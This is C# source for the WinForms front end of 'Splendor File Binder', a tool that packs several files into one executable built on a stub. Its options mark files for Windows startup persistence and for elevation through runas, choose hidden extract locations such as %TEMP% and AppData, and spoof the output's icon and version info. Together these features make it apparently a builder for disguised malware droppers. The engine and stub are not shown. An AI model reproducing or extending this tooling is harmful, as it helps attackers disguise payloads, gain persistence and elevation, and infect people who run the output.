// ============================================================================
// MainForm.cs - The WinForms GUI for Splendor File Binder
// ============================================================================

namespace SplendorFileBinder;

public partial class MainForm : Form
{
    private readonly DataGridView dgvFiles;
    private readonly Button btnAdd;
    private readonly Button btnRemove;
    private readonly Button btnClear;
    private readonly Button btnBind;
    private readonly Label lblStatus;
    private readonly ProgressBar progressBar;
    private readonly Label lblTitle;
    private readonly Label lblFileCount;
    private readonly TextBox txtStubPath;
    private readonly Button btnAssemblySettings;
    private readonly Label lblAssemblyStatus;
    private readonly ComboBox cmbExtractLocation;

    private readonly List<string> filePaths = new();
    private AssemblySettings assemblySettings = new();

    // File extensions eligible for Windows startup
    private static readonly HashSet<string> StartupExtensions = new(StringComparer.OrdinalIgnoreCase)
    {
        ".exe", ".com", ".scr", ".bat", ".cmd", ".vbs", ".js", ".wsf", ".ps1", ".lnk"
    };

    // File extensions eligible for Run as Admin (runas verb via ShellExecute)
    private static readonly HashSet<string> AdminExtensions = new(StringComparer.OrdinalIgnoreCase)
    {
        ".exe", ".com", ".scr", ".msi", ".bat", ".cmd", ".vbs", ".js", ".wsf", ".ps1", ".reg", ".cpl"
    };

    public MainForm()
    {
        // ---- Form Setup ----
        Text = "Splendor File Binder";
        ClientSize = new Size(700, 540);
        StartPosition = FormStartPosition.CenterScreen;
        FormBorderStyle = FormBorderStyle.FixedSingle;
        MaximizeBox = false;
        BackColor = Color.FromArgb(30, 30, 30);
        ForeColor = Color.White;

        string iconPath = Path.Combine(AppContext.BaseDirectory, "app.ico");
        if (File.Exists(iconPath))
            Icon = new Icon(iconPath);

        int pad = 20;
        int contentW = 700 - pad * 2;
        int btnX = 700 - pad - 90;
        int gridW = btnX - pad - 8;

        // ---- Title ----
        lblTitle = new Label
        {
            Text = "✦ SPLENDOR FILE BINDER ✦",
            Font = new Font("Segoe UI", 18, FontStyle.Bold),
            ForeColor = Color.FromArgb(0, 180, 255),
            TextAlign = ContentAlignment.MiddleCenter,
            Dock = DockStyle.Top,
            Height = 55,
            Padding = new Padding(0, 10, 0, 0),
            BackColor = Color.FromArgb(20, 20, 20)
        };
        Controls.Add(lblTitle);

        // ---- Stub Path ----
        Controls.Add(new Label
        {
            Text = "Stub Path (SplendorFileStub.exe):",
            Font = new Font("Segoe UI", 9), Location = new Point(pad, 66), AutoSize = true
        });

        txtStubPath = new TextBox
        {
            Location = new Point(pad, 88),
            Size = new Size(gridW, 28),
            Font = new Font("Consolas", 9),
            BackColor = Color.FromArgb(45, 45, 45),
            ForeColor = Color.White,
            BorderStyle = BorderStyle.FixedSingle,
            Text = FindDefaultStubPath()
        };
        Controls.Add(txtStubPath);

        var btnBrowseStub = new Button
        {
            Text = "...", Location = new Point(btnX, 86), Size = new Size(90, 28),
            FlatStyle = FlatStyle.Flat, BackColor = Color.FromArgb(60, 60, 60),
            ForeColor = Color.White, Font = new Font("Segoe UI", 9, FontStyle.Bold)
        };
        btnBrowseStub.Click += (_, _) =>
        {
            using var dlg = new OpenFileDialog { Title = "Locate SplendorFileStub.exe", Filter = "Executable (*.exe)|*.exe" };
            if (dlg.ShowDialog() == DialogResult.OK) txtStubPath.Text = dlg.FileName;
        };
        Controls.Add(btnBrowseStub);

        // ---- Assembly Settings Button + Extract Location (same row) ----
        btnAssemblySettings = new Button
        {
            Text = "⚙  Assembly Settings",
            Location = new Point(pad, 126),
            Size = new Size(195, 32),
            FlatStyle = FlatStyle.Flat,
            BackColor = Color.FromArgb(50, 50, 60),
            ForeColor = Color.FromArgb(0, 200, 255),
            Font = new Font("Segoe UI", 9.5f),
            Cursor = Cursors.Hand
        };
        btnAssemblySettings.FlatAppearance.BorderColor = Color.FromArgb(0, 120, 200);
        btnAssemblySettings.Click += (_, _) =>
        {
            using var dlg = new AssemblySettingsForm(assemblySettings);
            if (dlg.ShowDialog(this) == DialogResult.OK)
            {
                assemblySettings = dlg.Result;
                UpdateAssemblyStatusLabel();
            }
        };
        Controls.Add(btnAssemblySettings);

        lblAssemblyStatus = new Label
        {
            Text = "", Font = new Font("Segoe UI", 8, FontStyle.Italic),
            ForeColor = Color.FromArgb(0, 200, 130),
            Location = new Point(222, 133), Size = new Size(200, 18)
        };
        Controls.Add(lblAssemblyStatus);

        // Extract location dropdown (right side of same row)
        Controls.Add(new Label
        {
            Text = "Extract to:",
            Font = new Font("Segoe UI", 9),
            ForeColor = Color.FromArgb(170, 170, 180),
            Location = new Point(430, 132),
            AutoSize = true
        });

        cmbExtractLocation = new ComboBox
        {
            Location = new Point(505, 128),
            Size = new Size(175, 28),
            Font = new Font("Segoe UI", 9),
            BackColor = Color.FromArgb(45, 45, 50),
            ForeColor = Color.White,
            FlatStyle = FlatStyle.Flat,
            DropDownStyle = ComboBoxStyle.DropDownList
        };
        cmbExtractLocation.Items.AddRange(new object[]
        {
            "Temp  (%TEMP%)",
            "AppData  (%APPDATA%)",
            "Current Directory  (may need Admin)",
            "ProgramData  (Admin)",
        });
        cmbExtractLocation.SelectedIndex = 0; // Temp is default
        Controls.Add(cmbExtractLocation);

        // ---- File List Header ----
        lblFileCount = new Label
        {
            Text = "Files to bind: (0 files)",
            Font = new Font("Segoe UI", 10),
            Location = new Point(pad, 170),
            AutoSize = true
        };
        Controls.Add(lblFileCount);

        // ---- DataGridView ----
        dgvFiles = new DataGridView
        {
            Location = new Point(pad, 194),
            Size = new Size(gridW, 200),
            BackgroundColor = Color.FromArgb(38, 38, 42),
            GridColor = Color.FromArgb(52, 52, 58),
            BorderStyle = BorderStyle.FixedSingle,
            CellBorderStyle = DataGridViewCellBorderStyle.SingleHorizontal,
            RowHeadersVisible = false,
            AllowUserToAddRows = false,
            AllowUserToDeleteRows = false,
            AllowUserToResizeRows = false,
            SelectionMode = DataGridViewSelectionMode.FullRowSelect,
            MultiSelect = true,
            EditMode = DataGridViewEditMode.EditOnEnter,
            ScrollBars = ScrollBars.Vertical,
            Font = new Font("Segoe UI", 9.5f),
            EnableHeadersVisualStyles = false,
            ColumnHeadersHeight = 30,
            ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.DisableResizing
        };
        dgvFiles.RowTemplate.Height = 28;

        // Header style
        dgvFiles.ColumnHeadersDefaultCellStyle = new DataGridViewCellStyle
        {
            BackColor = Color.FromArgb(32, 32, 38),
            ForeColor = Color.FromArgb(160, 165, 175),
            Font = new Font("Segoe UI Semibold", 9f),
            SelectionBackColor = Color.FromArgb(32, 32, 38),
            SelectionForeColor = Color.FromArgb(160, 165, 175),
            Padding = new Padding(6, 0, 0, 0)
        };

        // Row style
        dgvFiles.DefaultCellStyle = new DataGridViewCellStyle
        {
            BackColor = Color.FromArgb(38, 38, 42),
            ForeColor = Color.LightGreen,
            SelectionBackColor = Color.FromArgb(0, 70, 120),
            SelectionForeColor = Color.White,
            Padding = new Padding(6, 0, 0, 0)
        };
        dgvFiles.AlternatingRowsDefaultCellStyle = new DataGridViewCellStyle
        {
            BackColor = Color.FromArgb(34, 34, 38),
            ForeColor = Color.LightGreen,
            SelectionBackColor = Color.FromArgb(0, 70, 120),
            SelectionForeColor = Color.White,
            Padding = new Padding(6, 0, 0, 0)
        };

        // Columns
        dgvFiles.Columns.Add(new DataGridViewTextBoxColumn
        {
            Name = "FileName", HeaderText = "File Name",
            Width = gridW - 90 - 70 - 70 - 22, ReadOnly = true,
            SortMode = DataGridViewColumnSortMode.NotSortable
        });

        var colSize = new DataGridViewTextBoxColumn
        {
            Name = "Size", HeaderText = "Size", Width = 90,
            ReadOnly = true, SortMode = DataGridViewColumnSortMode.NotSortable
        };
        colSize.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleRight;
        colSize.DefaultCellStyle.ForeColor = Color.FromArgb(150, 155, 165);
        dgvFiles.Columns.Add(colSize);

        var colStartup = new DataGridViewCheckBoxColumn
        {
            Name = "Startup", HeaderText = "Startup", Width = 70,
            SortMode = DataGridViewColumnSortMode.NotSortable,
            FalseValue = false, TrueValue = true
        };
        colStartup.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
        dgvFiles.Columns.Add(colStartup);

        var colAdmin = new DataGridViewCheckBoxColumn
        {
            Name = "Admin", HeaderText = "Admin", Width = 70,
            SortMode = DataGridViewColumnSortMode.NotSortable,
            FalseValue = false, TrueValue = true
        };
        colAdmin.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
        dgvFiles.Columns.Add(colAdmin);

        // Events to disable startup checkbox for non-eligible files
        dgvFiles.CellContentClick += DgvFiles_CellContentClick;
        dgvFiles.CellPainting += DgvFiles_CellPainting;

        Controls.Add(dgvFiles);

        // ---- Side Buttons ----
        btnAdd = MakeButton("➕ Add", btnX, 194);
        btnAdd.Click += BtnAdd_Click;
        Controls.Add(btnAdd);

        btnRemove = MakeButton("➖", btnX, 240);
        btnRemove.Click += BtnRemove_Click;
        Controls.Add(btnRemove);

        btnClear = MakeButton("🗑 Clear", btnX, 286);
        btnClear.Click += BtnClear_Click;
        Controls.Add(btnClear);

        btnBind = new Button
        {
            Text = "🔗 BIND",
            Location = new Point(btnX, 350),
            Size = new Size(90, 55),
            FlatStyle = FlatStyle.Flat,
            BackColor = Color.FromArgb(0, 140, 200),
            ForeColor = Color.White,
            Font = new Font("Segoe UI", 11, FontStyle.Bold)
        };
        btnBind.Click += BtnBind_Click;
        Controls.Add(btnBind);

        // ---- Progress Bar ----
        progressBar = new ProgressBar
        {
            Location = new Point(pad, 440),
            Size = new Size(contentW, 20),
            Style = ProgressBarStyle.Continuous, Minimum = 0, Maximum = 100
        };
        Controls.Add(progressBar);

        // ---- Status Label ----
        lblStatus = new Label
        {
            Text = "Ready. Add files and click BIND to create your executable.",
            Font = new Font("Segoe UI", 9),
            Location = new Point(pad, 466),
            Size = new Size(contentW, 50),
            ForeColor = Color.FromArgb(180, 180, 180)
        };
        Controls.Add(lblStatus);
    }

    // ----------------------------------------------------------------
    // DataGridView events
    // ----------------------------------------------------------------

    private void DgvFiles_CellContentClick(object? sender, DataGridViewCellEventArgs e)
    {
        if (e.RowIndex < 0 || e.RowIndex >= filePaths.Count) return;
        string colName = dgvFiles.Columns[e.ColumnIndex].Name;
        string ext = Path.GetExtension(filePaths[e.RowIndex]);

        if (colName == "Startup" && !StartupExtensions.Contains(ext))
        {
            BeginInvoke(() => dgvFiles.Rows[e.RowIndex].Cells["Startup"].Value = false);
            SetStatus($"⚠ {ext} files cannot be added to startup.", Color.Orange);
        }
        else if (colName == "Admin" && !AdminExtensions.Contains(ext))
        {
            BeginInvoke(() => dgvFiles.Rows[e.RowIndex].Cells["Admin"].Value = false);
            SetStatus($"⚠ {ext} files cannot run as admin.", Color.Orange);
        }
    }

    private void DgvFiles_CellPainting(object? sender, DataGridViewCellPaintingEventArgs e)
    {
        if (e.RowIndex < 0 || e.RowIndex >= filePaths.Count) return;
        string colName = dgvFiles.Columns[e.ColumnIndex].Name;
        string ext = Path.GetExtension(filePaths[e.RowIndex]);

        bool disabled = (colName == "Startup" && !StartupExtensions.Contains(ext)) ||
                        (colName == "Admin" && !AdminExtensions.Contains(ext));

        if (disabled)
        {
            e.PaintBackground(e.CellBounds, true);
            using var brush = new SolidBrush(Color.FromArgb(60, 60, 65));
            using var font = new Font("Segoe UI", 8f);
            var sz = e.Graphics!.MeasureString("—", font);
            float x = e.CellBounds.X + (e.CellBounds.Width - sz.Width) / 2;
            float y = e.CellBounds.Y + (e.CellBounds.Height - sz.Height) / 2;
            e.Graphics.DrawString("—", font, brush, x, y);
            e.Handled = true;
        }
    }

    // ----------------------------------------------------------------
    // Button handlers
    // ----------------------------------------------------------------

    private void BtnAdd_Click(object? sender, EventArgs e)
    {
        using var dlg = new OpenFileDialog
        {
            Title = "Select files to bind",
            Filter = "All Files (*.*)|*.*",
            Multiselect = true
        };
        if (dlg.ShowDialog() != DialogResult.OK) return;

        foreach (string file in dlg.FileNames)
        {
            if (filePaths.Contains(file)) continue;
            filePaths.Add(file);
            dgvFiles.Rows.Add(Path.GetFileName(file), FormatSize(new FileInfo(file).Length), false, false);
        }
        UpdateFileCount();
    }

    private void BtnRemove_Click(object? sender, EventArgs e)
    {
        var indices = dgvFiles.SelectedRows.Cast<DataGridViewRow>()
            .Select(r => r.Index).Where(i => i >= 0 && i < filePaths.Count)
            .OrderByDescending(i => i).ToList();
        foreach (int idx in indices) { filePaths.RemoveAt(idx); dgvFiles.Rows.RemoveAt(idx); }
        UpdateFileCount();
    }

    private void BtnClear_Click(object? sender, EventArgs e)
    {
        filePaths.Clear();
        dgvFiles.Rows.Clear();
        UpdateFileCount();
    }

    private async void BtnBind_Click(object? sender, EventArgs e)
    {
        if (filePaths.Count == 0) { SetStatus("⚠ Add at least one file.", Color.Orange); return; }

        string stubPath = txtStubPath.Text.Trim();
        if (!File.Exists(stubPath)) { SetStatus("⚠ Stub not found.", Color.Orange); return; }

        using var saveDlg = new SaveFileDialog
        {
            Title = "Save bound executable as...",
            Filter = "Executable (*.exe)|*.exe",
            FileName = "BoundOutput.exe"
        };
        if (saveDlg.ShowDialog() != DialogResult.OK) return;

        string outputPath = saveDlg.FileName;
        string? iconPath = assemblySettings.ChangeIcon ? assemblySettings.IconPath : null;
        var versionInfo = assemblySettings.ChangeAssemblyInfo ? assemblySettings.VersionInfo : null;

        // Collect startup files
        var startupFiles = new List<string>();
        var adminFiles = new List<string>();
        for (int i = 0; i < dgvFiles.Rows.Count && i < filePaths.Count; i++)
        {
            if (dgvFiles.Rows[i].Cells["Startup"].Value is true)
                startupFiles.Add(Path.GetFileName(filePaths[i]));
            if (dgvFiles.Rows[i].Cells["Admin"].Value is true)
                adminFiles.Add(Path.GetFileName(filePaths[i]));
        }

        // Get extract location
        string extractLocation = cmbExtractLocation.SelectedIndex switch
        {
            1 => "appdata",
            2 => "currentdir",
            3 => "programdata",
            _ => "temp"
        };

        // Disable UI
        SetEnabled(false);
        progressBar.Value = 0;
        SetStatus("⏳ Binding files...", Color.FromArgb(0, 180, 255));

        try
        {
            await Task.Run(() =>
            {
                BinderEngine.Bind(stubPath, filePaths, outputPath,
                    iconPath: iconPath, versionInfo: versionInfo,
                    startupFiles: startupFiles, adminFiles: adminFiles,
                    extractLocation: extractLocation,
                    progress: p => Invoke(() => progressBar.Value = (int)(p * 100)));
            });

            long sz = new FileInfo(outputPath).Length;
            SetStatus($"✅ Success! {Path.GetFileName(outputPath)} ({FormatSize(sz)})", Color.LightGreen);
            progressBar.Value = 100;

            MessageBox.Show(
                $"Bound executable created!\n\nOutput: {outputPath}\nSize: {FormatSize(sz)}\n" +
                $"Files: {filePaths.Count}" +
                (startupFiles.Count > 0 ? $"\nStartup: {startupFiles.Count}" : "") +
                (adminFiles.Count > 0 ? $"\nRun as Admin: {adminFiles.Count}" : "") +
                $"\nExtract to: {cmbExtractLocation.SelectedItem}",
                "Splendor File Binder", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (Exception ex)
        {
            SetStatus($"❌ Error: {ex.Message}", Color.OrangeRed);
            progressBar.Value = 0;
        }
        finally { SetEnabled(true); }
    }

    // ----------------------------------------------------------------
    // Helpers
    // ----------------------------------------------------------------

    private void SetEnabled(bool on)
    {
        btnBind.Enabled = on; btnAdd.Enabled = on;
        btnRemove.Enabled = on; btnClear.Enabled = on;
        btnAssemblySettings.Enabled = on; cmbExtractLocation.Enabled = on;
    }

    private void UpdateFileCount()
    {
        lblFileCount.Text = $"Files to bind: ({filePaths.Count} file{(filePaths.Count != 1 ? "s" : "")})";
    }

    private void UpdateAssemblyStatusLabel()
    {
        var parts = new List<string>();
        if (assemblySettings.ChangeAssemblyInfo && assemblySettings.VersionInfo.HasAnyValue)
            parts.Add("📋 " + (assemblySettings.VersionInfo.FileDescription
                ?? assemblySettings.VersionInfo.ProductName ?? "Custom"));
        if (assemblySettings.ChangeIcon && !string.IsNullOrEmpty(assemblySettings.IconPath))
            parts.Add("🎨 " + Path.GetFileName(assemblySettings.IconPath));

        lblAssemblyStatus.Text = parts.Count > 0 ? string.Join(" · ", parts) : "";
        lblAssemblyStatus.ForeColor = parts.Count > 0 ? Color.FromArgb(0, 200, 130) : Color.FromArgb(120, 120, 130);
    }

    private void SetStatus(string text, Color color)
    { lblStatus.Text = text; lblStatus.ForeColor = color; }

    private static Button MakeButton(string text, int x, int y) => new()
    {
        Text = text, Location = new Point(x, y), Size = new Size(90, 35),
        FlatStyle = FlatStyle.Flat, BackColor = Color.FromArgb(55, 55, 55),
        ForeColor = Color.White, Font = new Font("Segoe UI", 9)
    };

    private static string FormatSize(long bytes)
    {
        string[] u = ["B", "KB", "MB", "GB"];
        double s = bytes; int i = 0;
        while (s >= 1024 && i < u.Length - 1) { s /= 1024; i++; }
        return $"{s:F1} {u[i]}";
    }

    private static string FindDefaultStubPath()
    {
        var dirs = new List<string>();
        string? appDir = Path.GetDirectoryName(Application.ExecutablePath);
        if (appDir != null) dirs.Add(appDir);
        dirs.Add(Directory.GetCurrentDirectory());

        foreach (string d in dirs)
            if (File.Exists(Path.Combine(d, "SplendorFileStub.exe")))
                return Path.Combine(d, "SplendorFileStub.exe");

        string[] rels = [
            @"publish\Stub\SplendorFileStub.exe",
            @"..\..\..\..\..\publish\Stub\SplendorFileStub.exe",
            @"..\..\..\..\Stub\bin\Debug\net10.0\win-x64\SplendorFileStub.exe",
            @"src\Stub\bin\Debug\net10.0\win-x64\SplendorFileStub.exe",
        ];
        foreach (string d in dirs)
            foreach (string r in rels)
            { string f = Path.GetFullPath(Path.Combine(d, r)); if (File.Exists(f)) return f; }

        return "SplendorFileStub.exe";
    }
}
